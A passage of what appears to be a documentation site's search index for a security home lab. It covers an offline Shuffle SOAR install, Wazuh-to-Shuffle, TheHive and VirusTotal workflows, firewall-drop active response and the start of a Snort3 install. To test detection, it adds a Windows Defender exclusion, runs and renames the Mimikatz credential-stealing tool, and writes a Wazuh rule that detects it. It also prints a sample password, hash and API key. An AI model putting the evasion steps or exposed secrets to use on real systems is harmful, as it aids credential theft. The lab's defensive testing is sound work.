StrongShufflePassword321!\n$2y$12$5juqU2/ybhsBB4H928meCO4ZHtzTFSfDRO87AlAF43fhZOWgDlX1W\n</code></pre> <p>Replace the current hash for the <code>admin</code> user in the <code>internal_users.yml</code> file with the newly generated hash.  After editing the <code>internal_users.yml</code>, apply the changes to OpenSearch by running the <code>securityadmin_demo.sh</code> script inside the OpenSearch container:</p> <pre><code>[opensearch@shuffle-opensearch opensearch-security]$ vi internal_users.yml\n# \"i\" for insert, copy and paste theh hash, \"Esc\" then \":wq\" \n[opensearch@shuffle-opensearch opensearch-security]$ cd ../../\n[opensearch@shuffle-opensearch ~]$ pwd\n/usr/share/opensearch\n[opensearch@shuffle-opensearch ~]$ ./securityadmin_demo.sh \n[opensearch@shuffle-opensearch ~]$ exit\n</code></pre> <p>Change the file permission for *.pem in <code>/usr/share/opensearch/config</code> </p> <pre><code>cd /usr/share/opensearch/config\nchmod 0600 *.pem\n</code></pre> <p>Restart the shuffle-opensearch and shuffle-backend container </p> <pre><code>docker restart shuffle-opensearch\ndocker restart shuffle-backend\n</code></pre>"},{"location":"shuffle/shuffle.html#pull-and-save-docker-images","title":"Pull and Save Docker images","text":"<p>All the required Docker images have been pulled as saved as shuffle_images.tar. For your reference, the steps for pulling and saving the required Docker images are documented below.</p> <p>For this step, we are preparing images from a Ubuntu host with internet connection and Docker installed. The prepared images will then be transferred to the air-gapped environment.</p> <p>On Ubuntu host with internet connection and Docker Engine installed:</p> <p>Open <code>docker-compose.yml</code> file from Shuffle GitHub to identify the images you need.  Look for the <code>image</code> key under each service.</p> <pre><code>services:\n  frontend:\n    image: ghcr.io/shuffle/shuffle-frontend:latest\n  backend:\n    image:ghcr.io/shuffle/shuffle-backend:latest\n  orborus:\n    image: ghcr.io/shuffle/shuffle-orborus:latest\n    ghcr.io/shuffle/shuffle-app_sdk:latest\n    ghcr.io/shuffle/shuffle-worker:latest\n  opensearch:\n    image: opensearchproject/opensearch:2.14.0\n</code></pre> <p>Pull the Images using <code>docker pull:</code></p> <pre><code>docker pull ghcr.io/shuffle/shuffle-frontend:latest\ndocker pull ghcr.io/shuffle/shuffle-backend:latest\ndocker pull ghcr.io/shuffle/shuffle-orborus:latest\ndocker pull opensearchproject/opensearch:2.14.0\ndocker pull ghcr.io/shuffle/shuffle-app_sdk:latest\ndocker pull ghcr.io/shuffle/shuffle-worker:latest\n</code></pre> <p>Verify the Images are pulled by running <code>docker images</code></p> <p>Save the docker images for a transfer to an air-gapped environment</p> <pre><code>docker save -o shuffle_images.tar ghcr.io/shuffle/shuffle-frontend:latest ghcr.io/shuffle/shuffle-backend:latest ghcr.io/shuffle/shuffle-orborus:latest opensearchproject/opensearch:2.14.0 ghcr.io/shuffle/shuffle-app_sdk:latest ghcr.io/shuffle/shuffle-worker:latest\n</code></pre>"},{"location":"shuffle/shuffle.html#download-github-repositories-as-a-zip-archives","title":"Download GitHub repositories as a zip archives","text":"<p>All the required GitHub repositories are downloaded as Shuffle-main.zip and python-apps-master.zip. For your reference, the steps for downloading the required GitHub repositories are documented below. </p> <p>On Ubuntu host with internet connection and Docker installed:</p> <p>Download two repositories as zip archives from the Shuffle GitHub and Shuffle Python Apps GitHub page.</p> <p></p> <p></p> <p>Transfer the docker folder, shuffle_images.tar, Shuffle.zip and python-apps.zip to the Ubuntu host without internet connection. </p> <p>Repeat the steps above to install Docker Engine. </p> <p>Load the Docker images:</p> <pre><code>sudo docker load -i shuffle_images.tar\n</code></pre> <p>Unzip Shuffle.zip to the /opt directory and python-apps.zip to the /opt/Shuffle-main/shuffle-apps directory</p> <pre><code>sudo unzip Shuffle-main.zip -d /opt\nsudo unzip python-apps.zip -d /opt/Shuffle/shuffle-apps\n</code></pre> <p>Change into /opt/Shuffle-main directory</p> <p>Create \u201cshuffle-database\u201d folder</p> <p>Run prerequisites for the Opensearch database (Elasticsearch):</p> <pre><code>cd /opt/Shuffle\nsudo mkdir shuffle-database\n# IF you get an error using 'chown', add the user first with 'sudo useradd opensearch'                    \nsudo chown -R 1000:1000 shuffle-database  \n# Disable swap\nsudo swapoff -a                          \n</code></pre> <p>In the /opt/Shuffle-main folder, run docker-compose.</p> <pre><code>sudo docker compose up -d\n</code></pre> <p>Recommended for Opensearch to work well</p> <pre><code>sudo sysctl -w vm.max_map_count=262144             \n# https://www.elastic.co/guide/en/elasticsearch/reference/current/vm-max-map-count.html\n</code></pre>"},{"location":"shuffle/shuffle.html#creating-automated-workflows","title":"Creating Automated Workflows","text":""},{"location":"shuffle/shuffle.html#workflow-zero","title":"Workflow Zero","text":"<p>After installation, go to\u00a0http://(IP address):3001</p> <p>Create administrator account.</p> <p>Sign in with the same Username and Password. </p> <p></p> <p>Select New to Shuffle</p> <p></p> <p>Click Apps</p> <p>Verify there are activated apps</p> <p>If there are issues with loading the apps, click refresh or download from GitHub (internet required) </p> <p></p> <p>Create a new workflow on Shuffle titled \u201cWazuh integration test.\u201d</p> <p></p> <p></p> <p>Click on the\u00a0Triggers\u00a0tab in the bottom left and drag the\u00a0Webhook\u00a0to the workspace.</p> <p></p> <p>Click on the webhook and rename it to\u00a0Wazuh alerts. Copy and save the webhook URI and start the webhook. The webhook URI looks like the following: <code>http://10.0.0.27:3001/api/v1/hooks/webhook_d5c7de34-7dcd-4360-994f-4a134cde3d67</code></p> <p></p>"},{"location":"shuffle/shuffle.html#wazuh-server","title":"Wazuh server","text":"<p>Download the custom integration script custom-shuffle and custom-shuffle.py from the Shuffle GitHub page. Save it as custom-shuffle and custom-shuffle.py in /var/ossec/integrations directory of Wazuh manager.</p> <pre><code>[root@Centos integrations]# ls\n**custom-shuffle  custom-shuffle.py**  maltiverse  maltiverse.py  pagerduty  pagerduty.py  shuffle  shuffle.py  slack  slack.py  virustotal  virustotal.py\n</code></pre> <p>The script must contain execution permissions and belong to the\u00a0<code>root</code>\u00a0user of the\u00a0<code>wazuh</code>\u00a0group. The commands below assign permissions and ownership to the\u00a0<code>/var/ossec/integrations/custom-script</code>\u00a0script.</p> <pre><code>chmod 750 /var/ossec/integrations/custom-shuffle*\nchown root:wazuh /var/ossec/integrations/custom-shuffle*\n</code></pre> <p>Copy the content from ossec.conf from the Shuffle GitHub page.</p> <pre><code>&lt;integration&gt;\n  &lt;name&gt;custom-shuffle&lt;/name&gt;\n  &lt;level&gt;9&lt;/level&gt;\n  &lt;hook_url&gt;http://&lt;IP&gt;:&lt;PORT&gt;/api/v1/hooks/webhook_hookid&lt;/hook_url&gt;\n  &lt;alert_format&gt;json&lt;/alert_format&gt;\n&lt;/integration&gt;\n</code></pre> <p>Paste it into /var/ossec/etc/ossec.conf and edit it</p> <pre><code> &lt;integration&gt;\n      &lt;name&gt;custom-shuffle&lt;/name&gt;\n      &lt;level&gt;3&lt;/level&gt;\n      &lt;hook_url&gt;http://10.0.0.27:3001/api/v1/hooks/webhook_d5c7de34-7dcd-4360-994f-4a134cde3d67&lt;/hook_url&gt;\n      &lt;alert_format&gt;json&lt;/alert_format&gt;\n  &lt;/integration&gt;\n</code></pre> <p>Where:</p> <ul> <li><code>&lt;name&gt;</code>: This is the name of the integration and must match with your custom-shuffle downloaded from GitHub.</li> <li><code>&lt;hook_url&gt;</code>: This is the webhook URI copied from the Shuffle webhook. Note: <code>https://</code> can be used but it is not recommended as it causes a certificate mismatch error with the author\u2019s self-signed certificate.</li> <li><code>&lt;level&gt;</code>: This is used to forward a specific alert level.</li> <li><code>&lt;alert_format&gt;</code>: This forwards alerts to Shuffle in JSON format.</li> </ul> <p>Restart the Wazuh manager service to apply changes:</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre> <p>Verify that there are no errors in the ossec and integrations logs</p> <pre><code>tail /var/ossec/logs/ossec.log \ntail /var/ossec/logs/integrations.log\n</code></pre>"},{"location":"shuffle/shuffle.html#shuffle_1","title":"Shuffle","text":"<p>Click on the Shuffle Tools app named \u201cChange me\u201d and rename it to\u00a0Receive_Wazuh_alerts. Set the call option to \u201c<code>$exec</code>\u201d, and save the workflow. This Shuffle app now repeats the events that are received by the\u00a0Wazuh alerts\u00a0webhook. This allows us to test that Shuffle can receive Wazuh alerts.</p> <p></p> <p>Click on the\u00a0show executions\u00a0button.</p> <p></p> <p>Select any execution and expand it for details. You should see a Wazuh alert in the output.</p> <p></p> <p>Note: You may need to wait for a duration of time for Wazuh alerts to appear in Shuffle. This is dependent on the number of events generated in your environment. To manually trigger alerts, restart the Wazuh manager service on the Wazuh server.</p> <p>This shows that Wazuh is sending alerts to Shuffle and the integration is successful. </p>"},{"location":"shuffle/shuffle.html#workflow-one","title":"Workflow One","text":""},{"location":"shuffle/shuffle.html#configure-wazuh","title":"Configure Wazuh","text":""},{"location":"shuffle/shuffle.html#configure-wazuh-windows-client","title":"Configure Wazuh Windows Client","text":"<p>Add Administrator\u2019s Download folder to exclusion in the Windows Security setting.</p> <p></p> <p>Download and transfer mimikatz.exe. Mimikatz is a tool that can steal passwords and other login information from a Windows computer's memory, often used by attackers or penetration testers to gain access to more secure areas of the system.</p> <p>Open PowerShell as Administrator. Execute mimikatz.exe</p> <p></p>"},{"location":"shuffle/shuffle.html#configure-wazuh-manager","title":"Configure Wazuh Manager","text":"<p>On Wazuh Manager, verify that there are entries related to Mimikatz in the archives file</p> <pre><code>cat /var/ossec/logs/archives/archives.json | grep -i mimikatz\n</code></pre> <p>Verify that searching for \u201cmimikatz.exe\u201d in wazuh-archive-* index returns a result</p> <p></p> <p>Add a custom rule in /var/ossec/etc/rules/local_rules.xml</p> <p>Make sure indentation aligns with other rules</p> <p><code>nano /var/ossec/etc/rules/local_rules.xml</code></p> <pre><code>&lt;rule id=\"100200\" level=\"15\"&gt;\n  &lt;if_group&gt;sysmon_event1&lt;/if_group&gt;\n  &lt;field name=\"win.eventdata.originalFileName\" type=\"pcre2\"&gt;(?i)mimikatz&lt;/field&gt;\n  &lt;description&gt;Mimikatz Usage Detected&lt;/description&gt;\n  &lt;mitre&gt;\n    &lt;id&gt;T1003&lt;/id&gt;\n  &lt;/mitre&gt;\n&lt;/rule&gt;\n</code></pre> <p></p> <p>Restart Wazuh Manager</p> <pre><code>systemctl restart wazuh-manager\n</code></pre>"},{"location":"shuffle/shuffle.html#configure-windows-client","title":"Configure Windows Client","text":"<p>Rename mimikatz.exe to something else (e.g. justanexe)</p> <p></p> <p>Open PowerShell as Administrator and execute mimikatz (justanexe)</p> <p></p>"},{"location":"shuffle/shuffle.html#configure-wazuh-manager_1","title":"Configure Wazuh Manager","text":"<p>On Wazuh Manager, verify that there are entries related to ruld id 10020 Mimikatz Usage Detected</p> <p></p>"},{"location":"shuffle/shuffle.html#configure-shuffle","title":"Configure Shuffle","text":""},{"location":"shuffle/shuffle.html#upload-the-required-apps","title":"Upload the required Apps","text":"<p>On a machine with internet connection:</p> <p>Search for Wazuh, TheHive and VirusTotal in https://shuffler.io/search</p> <p>Download the OpenAPIs (JSON file)</p> <p></p> <p></p> <p></p> <p>Transfer the JSON files to the air-gapped environement.</p> <p>Navigate to Shuffle web UI and into Apps.</p> <p>Select Generate from Open API</p> <p></p> <p>Upload the Wazuh JSON file</p> <p></p> <p>Scroll to the bottom and click save.</p> <p></p> <p>Repeat the same proccess for TheHive</p> <p></p> <p>Verify that Wazuh, TheHive and Virustotal appear in the Activated Apps </p> <p></p> <p>To ensure that the new app is recognized by Shuffle, restart the Shuffle backend and frontend containers:</p> <pre><code>docker restart shuffle-backend\ndocker restart shuffle-frontend\n</code></pre>"},{"location":"shuffle/shuffle.html#create-a-workflow","title":"Create a Workflow","text":"<p>Repeat the steps covered in Introduction to Shuffle.</p> <p>Create a new workflow called SOC Automation Example. </p> <p>Click on the\u00a0Triggers\u00a0tab in the bottom left and drag the\u00a0Webhook\u00a0to the workspace.</p> <p>Click on the webhook and rename it to\u00a0Wazuh alerts. Copy and save the webhook URI and start the webhook. The webhook URI looks like the following: </p> <p><code>http://10.0.0.28:3001/api/v1/hooks/webhook_6f32bbd0-9ca9-498c-9abe-c55b1f573d09</code></p> <p></p>"},{"location":"shuffle/shuffle.html#configure-wazuh-server","title":"Configure Wazuh server","text":"<p>Download the custom integration script custom-shuffle and custom-shuffle.py. Save it as custom-shuffle and custom-shuffle.py in /var/ossec/integrations directory. The script must contain execution permissions and belong to the\u00a0<code>root</code>\u00a0user of the\u00a0<code>wazuh</code>\u00a0group: </p> <pre><code>chmod 750 /var/ossec/integrations/custom-shuffle*\nchown root:wazuh /var/ossec/integrations/custom-shuffle*\n</code></pre> <p>Copy and paste the following into /var/ossec/etc/ossec.conf</p> <p>This is the rule id for Mimikatz Usage Detected that we defined in the Wazuh Manager</p> <pre><code> &lt;integration&gt;\n      &lt;name&gt;custom-shuffle&lt;/name&gt;\n      &lt;rule_id&gt;100200&lt;/rule_id&gt;\n      &lt;hook_url&gt;http://10.0.0.28:3001/api/v1/hooks/webhook_6f32bbd0-9ca9-498c-9abe-c55b1f573d09&lt;/hook_url&gt;\n      &lt;alert_format&gt;json&lt;/alert_format&gt;\n  &lt;/integration&gt;\n</code></pre> <p>Restart the Wazuh manager service to apply changes:</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre> <p>Verify that there are no errors in the ossec and integrations logs</p> <pre><code>tail /var/ossec/logs/ossec.log \ntail /var/ossec/logs/integrations.log\n</code></pre>"},{"location":"shuffle/shuffle.html#configure-shuffle_1","title":"Configure Shuffle","text":"<p>Click on the Shuffle Tools app named \u201cChange me\u201d and rename it to\u00a0Receive_Wazuh_alerts. Set the call option to \u201c<code>$exec</code>\u201d, and save the workflow. This Shuffle app now repeats the events that are received by the\u00a0Wazuh alerts\u00a0webhook. This allows us to test that Shuffle can receive Wazuh alerts.</p> <p></p> <p>On Windows host, open PowerShell as Administrator and execute mimikatz (justanexe)</p> <p></p> <p>On Wazuh server, verify logs related to Mimikatz are generated </p> <pre><code>tail /var/ossec/logs/integrations.log\n</code></pre> <p>Verify Shuffle is receiving alerts without any errors </p> <p>Alerts should be green indicating status is FINISHED</p> <p></p> <p></p> <p>The results displays a SHA1, MD5 and SHA256 hashes</p> <p></p> <pre><code>SHA1=E3B6EA8C46FA831CEC6F235A5CF48B38A4AE8D69,MD5=29EFD64DD3C7FE1E2B022B7AD73A1BA5,SHA256=61C0810A23580CF492A6BA4F7654566108331E7A4134C968C2D6A05261B2D8A1,IMPHASH=55EE500BB4BDFC49F27A98AE456D8EDF\n</code></pre> <p>Create a regular expression to specifically extract the SHA256 hash from the string.</p> <pre><code>SHA256=([A-Fa-f0-9]{64})\n</code></pre> <p>Click Shuffle Tools icon. Change the Name to Capture_SHA256_HASH, Find Actions to Regex Capture group, Input data to $exec.text.win.eventdata.hashes and Regex to SHA256=([A-Fa-f0-9]{64})</p> <p></p> <p>Save the workflow. Trigger the rule id 100200 by running mimikatz (justanexe) from Windows host.</p> <p>You should see SHA256 hash returned in the results. If you are not seeing the SHA256 hash, try restarting your Shuffle by running <code>docker compose down</code>  and <code>docker compose up -d</code></p> <p></p> <p>Drag and drop Virustotal app. Change the Name to Virustotal, set Find Actions to Get a has report.</p> <p>Click Authenticate VirusTotal V3 and copy and paste your VirusTotal API key. You must create an account in VirusTotal to obtain the API key. Note: Internet connection was enabled from this point.</p> <p></p> <p></p> <p>For ID, select Capture_SHA256_Hash list</p> <p></p> <p></p> <p>Save the workflow. Restart Shuffle if required.</p> <p>Verify that Virustotal get_a_hash_report returns SHA256 hash of mimikatz with status code 200.</p> <p>Expand the last_analysis_stats. Malicious: 65 indicates that 65 scanners have detected this executable as malicious. </p> <p></p> <p></p>"},{"location":"shuffle/shuffle.html#configure-thehive","title":"Configure TheHive","text":"<p>Login to TheHive web UI</p> <p>Create a new organisation called Cyber and click Confirm</p> <p></p> <p>Click Cyber organisation</p> <p>Add a new user with following details</p> <ul> <li>Type: Normal</li> <li>Login: cyber@test.com</li> <li>Name: cyber</li> <li>Profile: analyst</li> </ul> <p>Save and add another user</p> <p></p> <p>Add the second user with following details</p> <ul> <li>Type: Service</li> <li>Login: shuffle@test.com</li> <li>Name: SOAR</li> <li>Profile: analyst</li> </ul> <p></p> <p>Click Preview on the cyber user and set a new password</p> <p></p> <p>Click Preview on the SOAR user and create an API key</p> <p>Copy the API key <code>Gq9gm4G4Vx2/Hajy0ezbwNbKVozXCgzR</code></p> <p></p> <p>Log out of the web UI as admin and login as the cyber user.</p> <p></p>"},{"location":"shuffle/shuffle.html#configure-shuffle_2","title":"Configure Shuffle","text":"<p>Drag and drop TheHive app to the Workflow.</p> <p>Click TheHive App and click Authenticate TheHive.</p> <p></p> <p>Copy and paste the API key <code>Gq9gm4G4Vx2/Hajy0ezbwNbKVozXCgzR</code></p> <p>Enter the url for TheHive <code>http://10.0.0.40:9000</code></p> <p>Click Submit.</p> <p></p> <p>Set Find Actions to Create alert</p> <p></p> <p>Connect Virustotal App to TheHive app</p> <p>There seems to be a bug with how TheHive app handles some of its parameters at the backend.</p> <p>To bypass the error, set the values for Flag and Pap in JSON first.</p> <p>Uncheck Show Body textbox. You should see Hide Body. Click Expand Window icon.</p> <p></p> <p>Manually set the Flag to false and Pap to 2. Click Submit.</p> <pre><code>{\n  \"description\": \"{{ '''${description}''' | replace: '\\n', '\\\\r\\\\n' }}\",\n  \"externallink\": \"${externallink}\",\n  \"flag\": false,\n  \"pap\": 2,\n  \"severity\": \"${severity}\",\n  \"source\": \"${source}\",\n  \"sourceRef\": \"${sourceref}\",\n  \"status\": \"${status}\",\n  \"summary\": \"${summary}\",\n  \"tags\": \"${tags}\",\n  \"title\": \"${title}\",\n  \"tlp\": ${tlp},\n  \"type\": \"${type}\"\n}\n</code></pre> <p></p> <p>Check the Show Body and this will allow you to edit the app in GUI.</p> <p></p> <p>Set the values to the following.</p> <p>Note: the values in brackets indicate the Execution Argument. Add the execution argument by clicking the <code>+</code> icon. </p> Name Create_Alert Severity 2 Summary Mimikatz detected on host: (computer) and the processID: (processID) and commandLine: (commandLine) Tags [\u201dT1003\u201d] Title (title) Description (rule description) Flag false Pap 2 Source Wazuh Sourceref Incident-(timestamp) Status New Tlp 2 Type Internal <p>Save the workflow. Click Show Execution (person icon) then rerun the workflow (refresh icon).</p> <p></p> <p></p> <p>Verify status code from TheHive is 201</p> <p></p> <p>Verify that the Mimikatz Usage Detected alert is generated on TheHive UI.</p> <p></p> <p>Click on the alert to view the details.</p> <p></p> <p>Drag and drop the Email app to the workflow.</p> <p>Edit the Email app with following details:</p> <p>Note: the values in brackets indicate the Execution Argument. Add the execution argument by clicking the <code>+</code> icon. </p> Name Email Find Actions Send email shuffle Apikey (Create account on https://shuffler.io/ to obtain API key) Recipients (Email address receiving the alert) Subject Mimikatz detected Body Time: (utcTime) Title: (title) Host: (computer) Malicious: (malicious)* <p>*Select VirusTotal metadata instead of the Execution Argument |</p> <p></p> <p>Save and rerun the workflow. If you want to get status code 201 from TheHive, you must delete existing alert. Verify that the results are successful and you received the email. </p> <p></p> <p></p> <p>Duplicate TheHive app in the workflow. </p> <p>Edit the TheHive app with following details:</p> <p>Note: the values in brackets indicate the metadata from Create_Alert. Add the data by clicking the <code>+</code> icon. </p> Name Create_Case Alertid (body id) <p></p> <p></p> <p>Save and rerun the workflow. You may need to delete existing alert in TheHive. </p> <p>Verify that results return status code 201.</p> <p></p> <p>Verify that the case has been created in TheHive.</p> <p></p>"},{"location":"shuffle/shuffle.html#workflow-two","title":"Workflow Two","text":""},{"location":"shuffle/shuffle.html#configure-shuffle_3","title":"Configure Shuffle","text":""},{"location":"shuffle/shuffle.html#create-a-workflow_1","title":"Create a Workflow","text":"<p>Repeat the steps covered in Introduction to Shuffle.</p> <p>Create a new workflow called SOC Automation Example Two. </p> <p>Click on the\u00a0Triggers\u00a0tab in the bottom left and drag the\u00a0Webhook\u00a0to the workspace.</p> <p>Click on the webhook and rename it to\u00a0Wazuh alerts. Copy and save the webhook URI and start the webhook. The webhook URI looks like the following: </p> <p><code>http://10.0.0.28:3001/api/v1/hooks/webhook_d8fde57c-5501-4063-8954-00af9f3056d3</code></p> <p></p>"},{"location":"shuffle/shuffle.html#configure-wazuh-server_1","title":"Configure Wazuh server","text":"<p>Download the custom integration script custom-shuffle and custom-shuffle.py. Save it as custom-shuffle and custom-shuffle.py in /var/ossec/integrations directory. The script must contain execution permissions and belong to the\u00a0<code>root</code>\u00a0user of the\u00a0<code>wazuh</code>\u00a0group: </p> <pre><code>chmod 750 /var/ossec/integrations/custom-shuffle*\nchown root:wazuh /var/ossec/integrations/custom-shuffle*\n</code></pre> <p>Copy and paste the following into /var/ossec/etc/ossec.conf</p> <p>The rule id 100100 has been configured to use Wazuh\u2019s active response to block malicious IP address. Refer to Blocking a known malicious actor (testing custom active response) from Introduction to Wazh. </p> <pre><code> &lt;integration&gt;\n      &lt;name&gt;custom-shuffle&lt;/name&gt;\n      &lt;rule_id&gt;**100100**&lt;/rule_id&gt;\n      &lt;hook_url&gt;**http://10.0.0.28:3001/api/v1/hooks/webhook_d8fde57c-5501-4063-8954-00af9f3056d3**&lt;/hook_url&gt;\n      &lt;alert_format&gt;json&lt;/alert_format&gt;\n  &lt;/integration&gt;\n</code></pre> <p>Restart the Wazuh manager service to apply changes:</p> <pre><code>sudo systemctl restart wazuh-manager\n</code></pre> <p>Verify that there are no errors in the ossec and integrations logs</p> <pre><code>tail /var/ossec/logs/ossec.log \ntail /var/ossec/logs/integrations.log\n</code></pre>"},{"location":"shuffle/shuffle.html#configure-shuffle_4","title":"Configure Shuffle","text":"<p>Click on the Shuffle Tools app named \u201cChange me\u201d and rename it to\u00a0Receive_Wazuh_alerts. Set the call option to \u201c<code>$exec</code>\u201d, and save the workflow. This Shuffle app now repeats the events that are received by the\u00a0Wazuh alerts\u00a0webhook. This allows us to test that Shuffle can receive Wazuh alerts.</p> <p></p> <p>Save the workflow.</p> <p>On kali machine, run curl command to access http://10.0.0.26</p> <pre><code>curl http://10.0.0.26 \n</code></pre> <p>On Wazuh manager, verify that this has triggered an alert by checking integrations log </p> <pre><code>tail /var/ossec/logs/integrations.log\n</code></pre> <p>On Shuffle, click Show Executions and verify that there is a successful result.</p> <p></p> <p>Drag and Drop HTTP app to the workflow.</p> <p>Edit the app with following detals:</p> <p>For Statement, use your wazuh API user\u2019s credentials.</p> Name Get-Wazuh-API Find Actions Curl Statement curl -u wazuh-wui:\"password\" -k -X GET \"https://10.0.0.20:55000/security/user/authenticate?raw=true\" <p></p> <p></p> <p>Drag and Drop Virustotal, Email and Wazuh apps to the workflow. Connect the apps in the order shown below:</p> <p></p> <p>Edit the Wazuh app with following details:</p> <p>Note: Arguments must be an array format <code>[\"value1\"]</code></p> Name Wazuh Find Actions Run Command Apikey (Get-Wazuh-API) Url https://10.0.0.20:55000 Agents list (agent id) Wait for complete true Arguments [\u201d(srcip)\u201d] Commnad firewall-drop60 <p>If you get an error with retrieving Wazuh API key, manually authenticate Wazuh App by providing Wazuh API key and Wazuh URL. Obtain API key from Get-Wazuh-API app (you will need to run your workflow to get the result):</p> <p></p> <p></p> <p>On Wazuh Manager, verify that active response is configured in ossec.conf</p> <p>The\u00a0<code>firewall-drop</code>\u00a0command integrates with the Ubuntu local iptables firewall and drops incoming network connection from the attacker endpoint for 60 seconds:</p> <pre><code>&lt;ossec_config&gt;\n  &lt;active-response&gt;\n    &lt;command&gt;firewall-drop&lt;/command&gt;\n    &lt;location&gt;local&lt;/location&gt;\n    &lt;rules_id&gt;100100&lt;/rules_id&gt;\n    &lt;timeout&gt;60&lt;/timeout&gt;\n  &lt;/active-response&gt;\n&lt;/ossec_config&gt;\n</code></pre> <p>When using the API, use the active-response command appended with timeout value. For example:</p> <pre><code>firewall-drop60\n</code></pre> <p>You can verify the command name to use with API by running <code>agent-control -L</code> located in /var/ossec/bin/</p> <pre><code>[root@Centos siem]# cd /var/ossec/bin\n[root@Centos bin]# ./agent_control -L\n\nWazuh agent_control. Available active responses:\n\n   Response name: firewall-drop60, command: firewall-drop\n</code></pre> <p>Edit the Virustotal app with following details:</p> <p>Note: the values in brackets indicate the Execution Argument. Add the execution argument by clicking the <code>+</code> icon. </p> <p>Authenticate with your VirusTotal API key (you will need to create an account).</p> Name Virustotal Find Actions Gen an IP address report IP (srcip) <p></p> <p>Save the workflow. Make sure webhook has been started. </p> <p>Trigger alert by running curl command from Kali machine:</p> <p>Note: for demonstration purposes, two network adapters have been assigned to both Ubuntu and Kali hosts. The network 192.168.1.0/24 belongs to Bridged network (Adapter #1) and 10.0.0.0/24 belongs to LAN segment (Adapter #2).  </p> <pre><code>curl http://10.0.0.26\ncurl http://192.168.1.111\n</code></pre> <p>Edit the Email app with following details:</p> <p>Note: the values in brackets indicate the Execution Argument. Add the execution argument by clicking the <code>+</code> icon. </p> Name Email Find Actions Send email shuffle Apikey (Create account on https://shuffler.io/ to obtain API key) Recipients (Email address receiving the alert) Subject Malicious activity detected Body Title: (title) Timestamp: (timestamp) Source IP: (srcip) Malicious: (malicious)* VirusTotal Result: (result)* <p>*These metadata are obtained from Virustotal instead of Execution Argument |</p> <p></p> <p>Save workflow. Trigger alert by accessing http://192.168.1.111 from Kali machine multiple times in a row.</p> <pre><code>curl http://192.168.1.111\n</code></pre> <p>Verify that workflow returns successful result. Verify status code 200 is returned by Virustotal and Wazuh. </p> <p></p> <p>Verify that active response blocks Kali machine:</p> <p></p> <p>Verify that you received an email from Shuffle:</p> <p></p>"},{"location":"shuffle/shuffle.html#references","title":"References","text":"<ul> <li>https://medium.com/shuffle-automation/introducing-shuffle-an-open-source-soar-platform-part-1-58a529de7d12</li> <li>https://github.com/Shuffle/Shuffle/blob/main/.github/install-guide.md</li> <li>https://docs.docker.com/desktop/install/ubuntu/</li> <li>https://shuffler.io/docs/configuration#servers</li> <li>https://docs.docker.com/engine/install/ubuntu/#install-using-the-repository</li> <li>https://wazuh.com/blog/integrating-wazuh-with-shuffle/</li> <li>https://documentation.wazuh.com/current/user-manual/manager/integration-with-external-apis.html</li> <li>https://youtu.be/GNXK00QapjQ?si=OHCAyUO2IAMzZF0U</li> <li>https://youtu.be/FBISHA7V15c?si=26Qe8BxiPxJVx7FP</li> </ul>"},{"location":"snort/snort.html","title":"Snort","text":"<p>Snort is an open-source network intrusion detection and prevention system (IDS/IPS) maintained by Cisco Systems. It is designed to monitor network traffic in real-time, analysing packets for signs of malicious activity, such as attacks, probes, or scans. Snort uses a combination of protocol analysis, content searching, and various preprocessors to detect and prevent intrusions.</p>"},{"location":"snort/snort.html#install-snort3-on-host","title":"Install Snort3 on Host","text":"<p>In this demonstration, we will be installing Snort3 on an Ubuntu virtual machine. We will be simulating install in an air-gapped environment but note that some parts of the step requires internet connection.</p>"},{"location":"snort/snort.html#lab-setup-for-proof-of-concept","title":"Lab Setup for Proof of Concept","text":"<p>In this proof of concept, attack simulation was conducted on the Kali machine in a safe and controlled setting. </p> <p>Note: Do not attempt to replicate the attack simulation demonstrated here unless you are properly trained and it is safe to do so. Unauthorised attack simulation can lead to legal consequences and unintended damage to systems. Always ensure that such activities are conducted by qualified professionals in a secure, isolated environment.</p> Host OS Role IP Address pfsense FreeBSD (pfSense v2.7.2) Firewall/Router (Gateway IDS/IPS) 192.168.1.200 (WAN) / 10.0.0.2 (LAN) Snort Ubuntu 22.04 LTS Host IDS/IPS 10.0.0.22 WS2019 Windows Server 2019 Windows client 10.0.0.24 Kali Kali Linux 2024.2 Attacker machine 10.0.0.29 <p></p>"},{"location":"snort/snort.html#download-pre-requisites","title":"Download Pre-requisites","text":"<p>On a machine with internet connection:</p> <p>Make a folder called /snort/pre-reqs and cd into it.</p> <pre><code>mkdir snort/pre-reqs\ncd snort/pre-reqs\n</code></pre> <p>Update the package lists and upgrade all the installed packages on your system to the latest available versions.</p> <pre><code>sudo apt-get update &amp;&amp; sudo apt-get upgrade -y\n</code></pre> <p>Download the required packages and their dependencies as a root user:</p> <pre><code>apt-get install -y --download-only build-essential autotools-dev libdumbnet-dev libluajit-5.1-dev \\\nlibpcap-dev zlib1g-dev pkg-config libhwloc-dev cmake liblzma-dev openssl libssl-dev cpputest \\\nlibsqlite3-dev libtool uuid-dev git autoconf bison flex libcmocka-dev libnetfilter-queue-dev \\\nlibunwind-dev libmnl-dev ethtool libjemalloc-dev libpcre3-dev libpcre16-3 libpcre32-3 libpcrecpp0v5 -o Dir::Cache::archives=\"/home/cyber/snort/pre-reqs\"\n\n#apt-get download libpcre3-dev libpcre16-3 libpcre32-3 libpcrecpp0v5\n</code></pre> <p>If you get permission error, change the directory\u2019s permission</p> <p>Error message:</p> <pre><code>W: Download is performed unsandboxed as root as file '/home/cyber/snort/pre-reqs/libpcre16-3_2%3a8.39-13ubuntu0.22.04.1_amd64.deb' couldn't be accessed by user '_apt'. - pkgAcquire::Run (13: Permission denied)\n</code></pre> <p>Change the directory permission:</p> <pre><code>sudo chmod 755 /home/cyber/snort/pre-reqs\n</code></pre>"},{"location":"snort/snort.html#download-dependencies-and-snort3","title":"Download Dependencies and Snort3","text":"<p>Change directory into snort</p> <pre><code>cd ~/snort\n</code></pre> <p>Download dependencies (pcre, gperftools, ragel, boost, hyperscan, flatbuffers, libdaq, pulledpork3) and Snort by running:</p> <pre><code>wget https://github.com/PCRE2Project/pcre2/releases/download/pcre2-10.44/pcre2-10.44.tar.gz\nwget https://github.com/gperftools/gperftools/releases/download/gperftools-2.15/gperftools-2.15.tar.gz\nwget https://www.colm.net/files/ragel/ragel-6.10.tar.gz\nwget https://boostorg.jfrog.io/artifactory/main/release/1.86.0/source/boost_1_86_0.tar.gz\nwget [https://github.com/intel/hyperscan/archive/refs/tags/v5.4.2.tar.gz](https://github.com/intel/hyperscan/archive/refs/tags/v5.4.2.tar.gz) -O hyperscan-v5.4.2.tar.gz\nwget 